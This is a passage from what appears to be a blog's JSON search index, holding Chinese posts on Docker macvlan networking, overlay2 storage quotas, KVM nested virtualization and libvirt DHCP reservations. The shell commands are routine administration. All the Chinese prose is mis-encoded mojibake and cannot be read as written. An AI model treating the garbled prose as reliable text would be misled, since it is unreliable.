172.18.31.33ï¼Œéƒ½æ˜¯ä¸é€šçš„ï¼Œè¿™æ˜¯macvlançš„ç‰¹æ€§ï¼Œæˆ‘ä»¬å¿…é¡»åšä¸ªæ“ä½œæ¥è§£å†³è¿™ä¸ªé—®é¢˜\nä¸‰ã€è§£å†³å®¿ä¸»æœºå’Œå®¹å™¨ä¹‹é—´çš„ç½‘ç»œé—®é¢˜\nç»™eth0åšä¸ªå­æ¥å£ï¼Œè§£å†³å®¿ä¸»æœºå’Œå®¹å™¨ä¹‹é—´çš„é€šè®¯é—®é¢˜\nip link add macvlan0-shim link eth0 type macvlan mode bridge ip addr add 172.18.31.34/32 dev macvlan0-shim ip link set macvlan0-shim up ip route add 172.18.31.0/24 dev macvlan0-shim è¿™æ ·å°±å¯ä»¥é€šäº†\næ³¨æ„ï¼Œè¿™æ ·å®¿ä¸»æœºå äº†ä¸¤ä¸ªIPï¼Œeth0å­æ¥å£çš„ipä¸èƒ½èƒ¡ä¹±ï¼Œå¿…é¡»è·Ÿç‹¬ç«‹ipåŒæ®µã€‚ æµªè´¹äº†ä¸€ä¸ªIPï¼Œä½†æ˜¯è§£å†³äº†å®¿ä¸»æœºå’Œå®¹å™¨ä¹‹é—´çš„ç½‘ç»œé—®é¢˜ã€‚\n","permalink":"https://rendoumi.com/posts/20231214-lxc_ip/","summary":"\u003cp\u003eåœ¨k8sæ²¡æœ‰å‡ºæ¥ä¹‹å‰ï¼Œæˆ‘ä»¬ç”¨çš„å°±æ˜¯LXCï¼Œå¤æ—©ç‰ˆæœ¬äº†ã€‚\u003c/p\u003e\n\u003cp\u003eè·‘çš„LXCï¼ŒåŸºäºdockerè¿›è¡Œç®¡ç†ï¼Œç½‘ç»œéƒ¨åˆ†ç‹¬ç«‹ã€‚\u003c/p\u003e\n\u003cp\u003eè¿›åŒ–åˆ°æ–°ç‰ˆæœ¬çš„Dockeråï¼Œç½‘ç»œéƒ¨åˆ†éœ€è¦ä¿®æ”¹ï¼Œæˆ‘ä»¬å†³å®šé‡‡ç”¨macvlanæ–¹å¼æ‰å¹³ç›´æ¥æ¥å…¥æœ¬åœ°ç½‘ç»œï¼š\u003c/p\u003e\n\u003cp\u003eDockerè£…å¥½ä»¥åï¼Œç³»ç»Ÿä¸­ä¼šå‡ºç°ä¸€ä¸ªDocker0çš„ç½‘ç»œï¼Œç”¨æ¥NATï¼Œæˆ‘ä»¬ä¸ç”¨è¿™ä¸ª\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu \u003cspan class=\"m\"\u003e1500\u003c/span\u003e qdisc pfifo_fast state UP group default qlen \u003cspan class=\"m\"\u003e1000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    link/ether 52:54:00:14:ee:63 brd ff:ff:ff:ff:ff:ff\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    inet 172.18.31.33/24 brd 172.18.31.255 scope global eth0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e       valid_lft forever preferred_lft forever\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3: docker0: \u0026lt;NO-CARRIER,BROADCAST,MULTICAST,UP\u0026gt; mtu \u003cspan class=\"m\"\u003e1500\u003c/span\u003e qdisc noqueue state DOWN group default \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    link/ether 02:42:ef:af:de:98 brd ff:ff:ff:ff:ff:ff\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e       valid_lft forever preferred_lft forever\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæˆ‘ä»¬è¦åšçš„æ˜¯å¯¹eth0åšmacvlanï¼Œä¸åšä»»ä½•iptableï¼Œç›´æ¥æ¥å…¥æœ¬åœ°ç½‘ç»œ\u003c/p\u003e\n\u003cp\u003eå®¿ä¸»æœºip: 172.18.31.33\nDocker1: 172.18.31.35\u003c/p\u003e\n\u003cp\u003eä¸€ã€å»ºmacvlan\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker network create -d macvlan \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e    --subnet\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.18.31.0/24 --gateway\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.18.31.254 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e    -o \u003cspan class=\"nv\"\u003eparent\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eeth0 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e    macvlan0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker network ls\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker inspect macvlan0\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¼šçœ‹åˆ°\u003c/p\u003e","title":"LXCæ›´æ–°åˆ°Dockerä¹‹åçš„IPéƒ¨åˆ†ä¿®æ”¹"},{"content":"åœ¨k8sæ²¡æœ‰å‡ºæ¥ä¹‹å‰ï¼Œæˆ‘ä»¬ç”¨çš„å°±æ˜¯LXCï¼Œå¤æ—©ç‰ˆæœ¬äº†ã€‚\né‚£æ—¶å€™æ˜¯1ï¼š60çš„è™šæ‹Ÿï¼Œä¸€å°ç‰©ç†æœºä¸Šè·‘60ä¸ªLXCï¼Œå±…ç„¶è¿™æ ·è¿è¡Œäº†8å¹´æ— å¼‚å¸¸ï¼Œç°åœ¨è¦å‡çº§ä¸€ä¸‹äº†ã€‚\né‚£æ—¶å€™çš„LXCï¼Œå­˜å‚¨ç©ºé—´æ— æ³•å•ç‹¬è®¾å®šï¼ˆç¼ºçœ10Gï¼‰ï¼Œcpuå’Œmemçš„limitä¹Ÿæœ‰è¿™æ ·é‚£æ ·çš„é—®é¢˜ã€‚\nè¿›åŒ–åˆ°æ–°ç‰ˆæœ¬çš„Dockeråï¼Œå­˜å‚¨éƒ¨åˆ†ä¹Ÿéœ€è¦ä¿®æ”¹ï¼Œæˆ‘ä»¬é‡‡ç”¨overlay2ï¼š\ndocker info ... Storage Driver: overlay2 Backing Filesystem: xfs Supports d_type: true Native Overlay Diff: true ... ç¼ºçœçš„å°±æ˜¯overlay2å’Œxfs\nä¸€ã€ä¿®æ”¹bootå†…æ ¸å¯åŠ¨å‚æ•°\nvi /etc/default/grub #åŠ ä¸Šrootflags=uquota,pquota GRUB_CMDLINE_LINUX=\u0026#34;console=tty0 crashkernel=auto net.ifnames=0 console=ttyS0 rootflags=uquota,pquota\u0026#34; #æ›´æ–° grub2-mkconfig -o /boot/grub2/grub.cfg #é‡å¯ reboot äºŒã€æ£€éªŒå¹¶å¯åŠ¨å®¹å™¨\ncat /proc/mounts |grep vda /dev/vda1 / xfs rw,relatime,attr2,inode64,usrquota,prjquota 0 0 æœ‰prjquotaå³å¯\næŒ‰éœ€å¯åŠ¨å®¹å™¨ï¼ŒæŒ‡å®šç©ºé—´å¤§å°ï¼Œsize=2G\ndocker run --rm -dit --name=t36 --storage-opt size=2G --net macvlan0 --ip=172.18.31.36 alpine:latest ash docker exec -it t36 ash df -h è¿™æ ·å°±å¯ä»¥å•ç‹¬é™åˆ¶å®¹å™¨çš„å¤§å°äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20231214-lxc_storage/","summary":"\u003cp\u003eåœ¨k8sæ²¡æœ‰å‡ºæ¥ä¹‹å‰ï¼Œæˆ‘ä»¬ç”¨çš„å°±æ˜¯LXCï¼Œå¤æ—©ç‰ˆæœ¬äº†ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£æ—¶å€™æ˜¯1ï¼š60çš„è™šæ‹Ÿï¼Œä¸€å°ç‰©ç†æœºä¸Šè·‘60ä¸ªLXCï¼Œå±…ç„¶è¿™æ ·è¿è¡Œäº†8å¹´æ— å¼‚å¸¸ï¼Œç°åœ¨è¦å‡çº§ä¸€ä¸‹äº†ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£æ—¶å€™çš„LXCï¼Œå­˜å‚¨ç©ºé—´æ— æ³•å•ç‹¬è®¾å®šï¼ˆç¼ºçœ10Gï¼‰ï¼Œcpuå’Œmemçš„limitä¹Ÿæœ‰è¿™æ ·é‚£æ ·çš„é—®é¢˜ã€‚\u003c/p\u003e\n\u003cp\u003eè¿›åŒ–åˆ°æ–°ç‰ˆæœ¬çš„Dockeråï¼Œå­˜å‚¨éƒ¨åˆ†ä¹Ÿéœ€è¦ä¿®æ”¹ï¼Œæˆ‘ä»¬é‡‡ç”¨overlay2ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker info\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e Storage Driver: overlay2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Backing Filesystem: xfs\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Supports d_type: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Native Overlay Diff: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç¼ºçœçš„å°±æ˜¯overlay2å’Œxfs\u003c/p\u003e\n\u003cp\u003eä¸€ã€ä¿®æ”¹bootå†…æ ¸å¯åŠ¨å‚æ•°\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/default/grub\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#åŠ ä¸Šrootflags=uquota,pquota\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eGRUB_CMDLINE_LINUX\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;console=tty0 crashkernel=auto net.ifnames=0 console=ttyS0 rootflags=uquota,pquota\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#æ›´æ–°\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrub2-mkconfig -o /boot/grub2/grub.cfg\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#é‡å¯\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ereboot\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eäºŒã€æ£€éªŒå¹¶å¯åŠ¨å®¹å™¨\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /proc/mounts  \u003cspan class=\"p\"\u003e|\u003c/span\u003egrep vda\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/vda1 / xfs rw,relatime,attr2,inode64,usrquota,prjquota \u003cspan class=\"m\"\u003e0\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæœ‰prjquotaå³å¯\u003c/p\u003e\n\u003cp\u003eæŒ‰éœ€å¯åŠ¨å®¹å™¨ï¼ŒæŒ‡å®šç©ºé—´å¤§å°ï¼Œsize=2G\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker run --rm -dit --name\u003cspan class=\"o\"\u003e=\u003c/span\u003et36 --storage-opt \u003cspan class=\"nv\"\u003esize\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e2G --net macvlan0 --ip\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.18.31.36 alpine:latest ash\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker \u003cspan class=\"nb\"\u003eexec\u003c/span\u003e -it t36 ash\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edf -h\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231214-lxc_storage/2020-08-24_104720.png\"\u003e\u003c/p\u003e","title":"LXCæ›´æ–°åˆ°Dockerä¹‹åçš„å­˜å‚¨éƒ¨åˆ†ä¿®æ”¹"},{"content":"kvmç”Ÿäº§çš„è™šæœºå†…ä»ç„¶å¯ä»¥å†äº§è™šæ‹Ÿæœºï¼Œè¿™å°±æ˜¯åµŒå¥—è™šæ‹ŸåŒ–\næˆ‘ä»¬çš„ç›®çš„æ˜¯è¦å†kvmè™šæœºä¸­å®‰è£…ä¸€å¥—proxmoxçš„ç³»ç»Ÿ\né¦–å…ˆåœ¨å®ä½“æœºä¸Šæ£€æŸ¥å½“å‰çš„Linuxæ˜¯å¦æ”¯æŒåµŒå¥—\nIntelçš„CPU cat /sys/module/kvm_intel/parameters/nested AMDçš„CPU cat /sys/module/kvm_amd/parameters/nested â€‹ ä¿®æ”¹æ”¯æŒï¼Œä»¥intelä¸ºä¾‹ï¼š\nvi /etc/modprobe.d/kvm.conf options kvm_intel nested=1 rebootå°±å¥½\nä¸é‡å¯çš„è¯ï¼Œå¯ä»¥å…ˆå¸è½½æ¨¡å—ï¼Œç„¶åé‡æ–°åŠ è½½\nmodprobe -r kvm_intel modprobe kvm_intel ç„¶åæ£€æŸ¥ä¸€ä¸‹\ncat /sys/module/kvm_intel/parameters/nested proxmoxå®‰è£…çš„æ—¶å€™ï¼ŒæŒ‡å®šcpu=hostï¼š\n#!/bin/sh qemu-img create -f qcow2 /export/kvm/proxmox-168-86-103/proxmox-168-86-103.qcow2 200G virt-install \\ --name=proxmox-168-86-103 \\ --cpu=host \\ --ram=8192 \\ --disk path=/export/kvm/proxmox-168-86-103/proxmox-168-86-103.qcow2,format=qcow2,size=200 \\ --cdrom=/export/kvm/iso/proxmox-ve_7.0-2.iso \\ --os-type=Linux \\ --network bridge=br0 \\ --vnc --vnclisten=0.0.0.0 --vncport=5903 ","permalink":"https://rendoumi.com/posts/20231214-kvm_nested/","summary":"\u003cp\u003ekvmç”Ÿäº§çš„è™šæœºå†…ä»ç„¶å¯ä»¥å†äº§è™šæ‹Ÿæœºï¼Œè¿™å°±æ˜¯åµŒå¥—è™šæ‹ŸåŒ–\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬çš„ç›®çš„æ˜¯è¦å†kvmè™šæœºä¸­å®‰è£…ä¸€å¥—proxmoxçš„ç³»ç»Ÿ\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆåœ¨å®ä½“æœºä¸Šæ£€æŸ¥å½“å‰çš„Linuxæ˜¯å¦æ”¯æŒåµŒå¥—\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eIntelçš„CPU\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /sys/module/kvm_intel/parameters/nested\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eAMDçš„CPU\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /sys/module/kvm_amd/parameters/nested\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eâ€‹\nä¿®æ”¹æ”¯æŒï¼Œä»¥intelä¸ºä¾‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/modprobe.d/kvm.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eoptions kvm_intel \u003cspan class=\"nv\"\u003enested\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003erebootå°±å¥½\u003c/p\u003e\n\u003cp\u003eä¸é‡å¯çš„è¯ï¼Œå¯ä»¥å…ˆå¸è½½æ¨¡å—ï¼Œç„¶åé‡æ–°åŠ è½½\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emodprobe -r kvm_intel\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emodprobe kvm_intel\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åæ£€æŸ¥ä¸€ä¸‹\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /sys/module/kvm_intel/parameters/nested\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eproxmoxå®‰è£…çš„æ—¶å€™ï¼ŒæŒ‡å®šcpu=hostï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003eqemu-img create -f qcow2 /export/kvm/proxmox-168-86-103/proxmox-168-86-103.qcow2 200G\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirt-install \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --name\u003cspan class=\"o\"\u003e=\u003c/span\u003eproxmox-168-86-103 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --cpu\u003cspan class=\"o\"\u003e=\u003c/span\u003ehost \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --ram\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e8192\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --disk \u003cspan class=\"nv\"\u003epath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/export/kvm/proxmox-168-86-103/proxmox-168-86-103.qcow2,format\u003cspan class=\"o\"\u003e=\u003c/span\u003eqcow2,size\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e200\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --cdrom\u003cspan class=\"o\"\u003e=\u003c/span\u003e/export/kvm/iso/proxmox-ve_7.0-2.iso \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --os-type\u003cspan class=\"o\"\u003e=\u003c/span\u003eLinux  \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --network \u003cspan class=\"nv\"\u003ebridge\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr0 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --vnc --vnclisten\u003cspan class=\"o\"\u003e=\u003c/span\u003e0.0.0.0 --vncport\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e5903\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"KVMçš„åµŒå¥—è™šæ‹ŸåŒ–"},{"content":"ç¼ºçœæƒ…å†µä¸‹kvmä¼šä¿ç•™ä¸€ä¸ªnatçš„ç½‘ç»œï¼Œip aå‘½ä»¤æŸ¥çœ‹ï¼Œä¼šçœ‹åˆ°virbr0å’Œvirbr0-nic\n8: virbr0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UNKNOWN link/ether 52:54:00:6c:22:2c brd ff:ff:ff:ff:ff:ff inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0 9: virbr0-nic: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 500 link/ether 52:54:00:6c:22:2c brd ff:ff:ff:ff:ff:ff è¿™ä¸ªå¦‚æœè™šæœºéƒ½æ˜¯é™æ€IPï¼Œä¸”ä¸åšNATçš„è¯ï¼Œåˆ™æ— å¿…è¦ä¿ç•™ï¼Œå¯ä»¥å½»åº•åˆ æ‰ã€‚\nkvmåˆ é™¤æ‰ç¼ºçœç½‘ç»œ\nvirsh net-destroy default virsh net-undefine default é‚£ä¹ˆå¦‚æœéç”¨ä¸å¯ï¼Œè¿˜éœ€è¦ç»™ç‰¹å®šè™šæœºç”¨dhcpæŒ‡å®šå›ºå®šIP æ–¹æ³•å¦‚ä¸‹ï¼š\næŸ¥çœ‹ç¼ºçœç½‘ç»œ\n$ virsh net-list Name State Autostart Persistent ---------------------------------------------------------- default active yes yes æ‰¾å‡ºè™šæœºçš„macåœ°å€\n$ virsh dumpxml vis-16-10-33 | grep -i \u0026#39;\u0026lt;mac\u0026#39; \u0026lt;mac address=\u0026#39;f0:00:ac:10:0a:21\u0026#39;/\u0026gt; ç¼–è¾‘ç½‘ç»œ\n$ virsh net-edit default \u0026lt;network\u0026gt; \u0026lt;name\u0026gt;default\u0026lt;/name\u0026gt; \u0026lt;uuid\u0026gt;58e86841-ef4b-4d63-bf4f-7888515b8474\u0026lt;/uuid\u0026gt; \u0026lt;forward mode=\u0026#39;nat\u0026#39;/\u0026gt; \u0026lt;bridge name=\u0026#39;virbr0\u0026#39; stp=\u0026#39;on\u0026#39; delay=\u0026#39;0\u0026#39; /\u0026gt; \u0026lt;mac address=\u0026#39;52:54:00:6C:22:2C\u0026#39;/\u0026gt; \u0026lt;ip address=\u0026#39;192.168.122.1\u0026#39; netmask=\u0026#39;255.255.255.0\u0026#39;\u0026gt; \u0026lt;dhcp\u0026gt; \u0026lt;range start=\u0026#39;192.168.122.2\u0026#39; end=\u0026#39;192.168.122.254\u0026#39; /\u0026gt; \u0026lt;/dhcp\u0026gt; \u0026lt;/ip\u0026gt; \u0026lt;/network\u0026gt; åœ¨rangeä¸‹é¢æ¥ä¸€åˆ—\n\u0026lt;dhcp\u0026gt; \u0026lt;range start=\u0026#39;192.168.122.2\u0026#39; end=\u0026#39;192.168.122.254\u0026#39; /\u0026gt; \u0026lt;host mac=\u0026#39;f0:00:ac:10:0a:21\u0026#39; name=\u0026#39;vis-16-10-33\u0026#39; ip=\u0026#39;192.168.122.10\u0026#39;/\u0026gt; \u0026lt;/dhcp\u0026gt; ä¿å­˜é€€å‡ºï¼Œé‡å¯ç½‘ç»œ\n$ virsh net-destroy default $ virsh net-start default ç„¶åå°±å¯ä»¥äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20231214-kvm_dhcp/","summary":"\u003cp\u003eç¼ºçœæƒ…å†µä¸‹kvmä¼šä¿ç•™ä¸€ä¸ªnatçš„ç½‘ç»œï¼Œip aå‘½ä»¤æŸ¥çœ‹ï¼Œä¼šçœ‹åˆ°virbr0å’Œvirbr0-nic\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e8: virbr0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu \u003cspan class=\"m\"\u003e1500\u003c/span\u003e qdisc noqueue state UNKNOWN 